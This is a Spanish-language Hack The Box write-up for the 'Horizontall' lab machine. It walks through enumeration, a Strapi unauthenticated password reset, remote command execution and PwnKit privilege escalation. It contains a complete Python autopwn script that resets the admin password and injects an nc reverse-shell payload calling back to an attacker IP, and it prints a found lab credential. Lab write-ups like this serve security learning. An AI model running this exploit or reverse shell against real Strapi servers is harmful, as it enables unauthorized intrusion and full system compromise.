---
title: Horizontall 
layout: page
permalink: /HTB_Horizontall
---

<h2 class="amarillo">Horizontall</h2>
<div id="logos" style="text-align: center;">
  <img src="/assets/images/HTB/Horizontall/horizontall.png" alt="under" oncontextmenu="return false;">
</div>

<h2 class="amarillo">Enumeración</h2>
Encendemos la máquina Horizontall y obtenemos la dirección ip 10.129.6.150, le hacemos un escaneo de puertos abiertos con nmap.

`nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.129.6.150`

<div style="text-align: center;">
  <img src="/assets/images/HTB/Horizontall/1.png" alt="under" oncontextmenu="return false;">
</div>

Solo tiene el puerto 22 y 80 abiertos, le lanzamos una serie de script básicos de reconocimiento para identificar la versión y servicio que corren para cada uno de estos puertos con `-sCV`.
<div style="text-align: center;">
  <img src="/assets/images/HTB/Horizontall/2.png" alt="under" oncontextmenu="return false;">
</div>

Vemos que nos esta aplicando un redirect al dominio **horizontall.htb**, puede que este aplicando virtual hosting, agregamos entonces este dominio al archivo /etc/hosts.
<div style="text-align: center;">
  <img src="/assets/images/HTB/Horizontall/3.png" alt="under" oncontextmenu="return false;">
</div>

Utilizamos whatweb para enumerar las tecnologías empleadas por el sitio web

<div style="text-align: center;">
  <img src="/assets/images/HTB/Horizontall/4.png" alt="under" oncontextmenu="return false;">
</div>

Abrimos la página para ver ante lo que nos estamos enfrentamos y vemos un sitio web que no tiene mucha información interesante.
<div style="text-align: center;">
  <img src="/assets/images/HTB/Horizontall/5.png" alt="under" oncontextmenu="return false;">
</div>

Utilizando curl podemos hacer un source code analysis para saber si los desarrolladores han dejado alguna pista o servicio expuesto.
<div style="text-align: center;">
  <img src="/assets/images/HTB/Horizontall/6.png" alt="under" oncontextmenu="return false;">
</div>

Lo que más llama la atención es el nombre de los archivos, pero el único interesante de todos los que vemos es el javascript, así que tratamos de abrirlo en la página.
<div style="text-align: center;">
  <img src="/assets/images/HTB/Horizontall/7.png" alt="under" oncontextmenu="return false;">
</div>

Que no agobie ver tanta información ya que podremos filtrar entre la data, y entre ella encontramos un dominio llamado **api-prod.horizontall.htb**

Lo agregamos al archivo /etc/hosts
<div style="text-align: center;">
  <img src="/assets/images/HTB/Horizontall/8.png" alt="under" oncontextmenu="return false;">
</div>

Y la página parece estar en blanco con un simple welcome, llegados a este punto probamos algo de Fuzzing.
<div style="text-align: center;">
  <img src="/assets/images/HTB/Horizontall/9.png" alt="under" oncontextmenu="return false;">
</div>

<h2 class="amarillo">Fuzzing</h2>

Para el fuzzing lo haremos con la herramienta wfuzz:
```bash
wfuzz -c -t 200 --hc=404 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -u http://api-prod.horizontall.htb/FUZZ
```
<div style="text-align: center;">
  <img src="/assets/images/HTB/Horizontall/10.png" alt="under" oncontextmenu="return false;">
</div>

Y encontramos un apartado de (users, admin y reviews)
<div style="text-align: center;">
  <img src="/assets/images/HTB/Horizontall/11.png" alt="under" oncontextmenu="return false;">
</div>
<div style="text-align: center;">
  <img src="/assets/images/HTB/Horizontall/12.png" alt="under" oncontextmenu="return false;">
</div>

Pero al entrar a revisar el de admin nos lleva a un login **Strapi**
<div style="text-align: center;">
  <img src="/assets/images/HTB/Horizontall/13.png" alt="under" oncontextmenu="return false;">
</div>

Probamos algo de suerte buscando con searchsploit Strapi
<div style="text-align: center;">
  <img src="/assets/images/HTB/Horizontall/14.png" alt="under" oncontextmenu="return false;">
</div>


Con la información que nos retorna Strapi no podemos hacer mucho, aun no conocemos la versión de strapi, y probar credenciales por defecto como admin:admin no funciona pero, probando set password unauthenticated nos pedirá el correo, el cual probando con burpsuite encuentro un potencial usuario válido:
<div style="text-align: center;">
  <img src="/assets/images/HTB/Horizontall/15.png" alt="under" oncontextmenu="return false;">
</div>

Utilizando entonces el script de searchsploit podremos configurar una nueva contraseña para el usuario admin
<div style="text-align: center;">
  <img src="/assets/images/HTB/Horizontall/16.png" alt="under" oncontextmenu="return false;">
</div>

de esta forma podremos iniciar sesión como admin.
<div style="text-align: center;">
  <img src="/assets/images/HTB/Horizontall/17.png" alt="under" oncontextmenu="return false;">
</div>


y estaremos en el panel administrativo de strapi.

<div style="text-align: center;">
  <img src="/assets/images/HTB/Horizontall/18.png" alt="under" oncontextmenu="return false;">
</div>


Revisando la web de strapi vemos un apartado upload/
<div style="text-align: center;">
  <img src="/assets/images/HTB/Horizontall/19.png" alt="under" oncontextmenu="return false;">
</div>


Podemos subir archivos, así que tratamos de subir un php.

<div style="text-align: center;">
  <img src="/assets/images/HTB/Horizontall/20.png" alt="under" oncontextmenu="return false;">
</div>


Viendo las cookies guardadas tenemos una de sesión que es un jwt.
<div style="text-align: center;">
  <img src="/assets/images/HTB/Horizontall/21.png" alt="under" oncontextmenu="return false;">
</div>

Solo queda ejecutar el exploit de searchsploit y tendremos acceso a la máquina concluyendo la intrusión (Hemos ejecutado 2 scripts).
<div style="text-align: center;">
  <img src="/assets/images/HTB/Horizontall/22.png" alt="under" oncontextmenu="return false;">
</div>

<h2 class="amarillo">Script Autopwn</h2>

Sin embargo, para practicar he creado un script que nos automatiza la intrusión.
<div style="text-align: center;">
  <img src="/assets/images/HTB/Horizontall/27.png" alt="under" oncontextmenu="return false;">
</div>

```python
#!/usr/bin/env python3
# Author: Juan Garcia aka liandd

import sys
import signal
from termcolor import colored
import argparse
import requests
import re
import json
from pwn import *
import threading


# Variables Globales
thread = None


# Ctrl_C
def def_handler(sig, frame):
    print(colored("\n\n[!] Saliendo...", "red"))
    stop_event.set()

    if thread and thread.is_alive():
        thread.join()

    sys.exit(1)


# Ctrl_C
signal.signal(signal.SIGINT, def_handler)


def get_arguments():
    parser = argparse.ArgumentParser(
        description=colored("AutoPwn Horizontall", "red")+colored(" HTB", "green")+" by "+colored("liandd", "red"))
    parser.add_argument('-u', '--url', dest="URL",
                        help="Machine API URL to Pwn (i.e --url http://api-prod.horizontall.htb/)")
    parser.add_argument('-P', '--password', dest="PASSWORD",
                        help="Set new Password to administrator user (i.e -P paloloco)")
    parser.add_argument('-i', '--ip', dest="IP",
                        help="IP address to get shell (i.e --IP 10.10.16.42)")
    parser.add_argument('-p', '--port', dest="PORT",
                        help="PORT to get shell (i.e --port 443)")

    options = parser.parse_args()
    if options.URL is None or options.PASSWORD is None or options.IP is None or options.PORT is None:
        parser.print_help()
        print("\n\n")
        sys.exit(1)
    return options.URL, options.PASSWORD, options.IP, options.PORT


def check_strapi_version(URL):
    p1 = log.progress(colored("Checking Strapi Version...", "red"))
    version = requests.get(URL+'/admin/init').text
    regex = r"""\"strapiVersion\":\"([^\"]+)\""""
    version = re.findall(regex, version)

    if version == ["3.0.0-beta.17.4"]:
        p1.status(colored("This is Vulnerable!!", "green"))
    else:
        print(colored("\n[!] Sorry...\n", "red"))
        sys.exit(1)


def exploitAPI(URL, PASSWORD):
    global jwt
    current_session = requests.session()
    data = {"code": {"$gt": 0},
            "password": PASSWORD,
            "passwordConfirmation": PASSWORD}

    print("\n")
    p2 = log.progress(colored("Setting new Password - %s" % PASSWORD, "blue"))

    output = current_session.post(
        "%s/admin/auth/reset-password" % URL, json=data).text
    p2.status(output)
    response = json.loads(output)
    jwt = response["jwt"]
    username = response["user"]["username"]
    email = response["user"]["email"]

    if "jwt" not in output:
        print(colored("[!] FAILDED Password reset...\n\n", "red"))
        sys.exit(1)
    else:
        print(colored(
            f"[+] Password reset was successfull\n[+] Your email is: {email}\n[+] New Credentials: {username}:{PASSWORD}\n[+] Your authenticated JSON Web Token: {jwt}\n\n", "green"))


def get_shell(URL, IP, PORT):
    while not stop_event.is_set():
        headers = {"Authorization": f"Bearer {jwt}"}
        payload = """rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc %s %s >/tmp/f|bash""" % (
            IP, PORT)
        data = {"plugin": f"documentation && $({payload})",
                "port": "1337"}
        r = requests.post(f"{URL}/admin/plugins/install",
                          json=data, headers=headers)


def main():
    URL, PASSWORD, IP, PORT = get_arguments()
    if URL.endswith("/"):
        URL = URL[:-1]

    check_strapi_version(URL)
    exploitAPI(URL, PASSWORD)

    global stop_event, thread
    stop_event = threading.Event()

    try:
        thread = threading.Thread(target=get_shell, args=(URL, IP, PORT))
        thread.start()
    except Exception as e:
        print(colored(e, "red"))

    shell = listen(PORT, timeout=20).wait_for_connection()
    shell.interactive()


if __name__ == '__main__':
    main()
```

<h2 class="amarillo">Escalada</h2>

Para la escalada comenzamos con una enumeración inicial de archivos en búsqueda de credenciales con grep y parámetros recursivos `-r -i "password"` y encontramos una credencial
<div style="text-align: center;">
  <img src="/assets/images/HTB/Horizontall/23.png" alt="under" oncontextmenu="return false;">
</div>

Hacemos lo mismo pero para usuarios

<div style="text-align: center;">
  <img src="/assets/images/HTB/Horizontall/24.png" alt="under" oncontextmenu="return false;">
</div>

Y encontramos al usuario developer
```bash
developer: #J!:F9Zt2u
```

Viendo que hay un usuario developer en el sistema, tratamos de iniciar sesión reutilizando credenciales pero no funciona, así que probamos a conectarnos a la base de datos y logramos autenticarnos con el mysql.
<div style="text-align: center;">
  <img src="/assets/images/HTB/Horizontall/25.png" alt="under" oncontextmenu="return false;">
</div>

La base de datos fue un RabbitHole porque no hayamos nada, revisando entonces los binarios SUID encontramos el infame pkexec el cual es la primera vez que explotamos:

# PwnKit
> Polkit (formerly PolicyKit) is a component for controlling system-wide privileges in Unix-like operating systems. It provides an organized way for non-privileged processes to communicate with privileged processes. It is also possible to use polkit to execute commands with elevated privileges using the command pkexec followed by the command intended to be executed (with root permission).

https://github.com/berdav/CVE-2021-4034

Probamos a traernos el binario a la maquina Horizontall y efectivamente nos da acceso como root al sistema.
<div style="text-align: center;">
  <img src="/assets/images/HTB/Horizontall/26.png" alt="under" oncontextmenu="return false;">
</div>

<div style="text-align: center;">
  <img src="/assets/images/HTB/Horizontall/pwn.png" alt="under" oncontextmenu="return false;">
</div>

